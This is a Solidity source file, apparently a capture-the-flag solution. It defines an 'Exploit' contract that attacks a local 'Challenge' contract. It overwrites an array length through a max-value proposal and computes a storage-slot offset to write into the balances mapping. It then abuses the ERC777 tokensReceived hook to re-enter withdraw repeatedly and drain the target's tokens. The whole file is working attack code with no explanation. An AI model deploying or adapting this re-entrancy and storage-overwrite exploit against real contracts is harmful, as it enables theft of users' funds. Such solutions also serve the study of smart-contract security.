pragma solidity 0.8.0;

import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

import "./Challenge.sol";


contract Exploit is IERC777Recipient {
    Challenge challenge;
    ERC777 govToken;
    uint256 public idx;
    bool done;

    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    constructor(Challenge _challenge) {
        challenge = _challenge;
        govToken = ERC777(challenge.govTokens(0));

        _erc1820.setInterfaceImplementer(
            address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)
        );
    }

    function finalize() external {
        // get tokens from faucet
        challenge.faucet();

        // add proposal to overwite length of tokens
        challenge.addProposal(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);

        // calculate offset
        // keccak256(slot 3) - keccak256(slot - 0)
        idx = uint256(keccak256(abi.encode(3))) - uint256(keccak256(abi.encode(0)));

        // deposit
        govToken.approve(address(challenge), 10 ether);
        challenge.deposit(idx, 10 ether);

        // withdraw to trigger re-entrancy
        challenge.withdraw(idx);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        address token = challenge.govTokens(0);

        uint256 balance = ERC777(token).balanceOf(address(challenge));
        if(balance > challenge.balances(token, msg.sender)) {
            challenge.withdraw(idx);
        }
    }
}
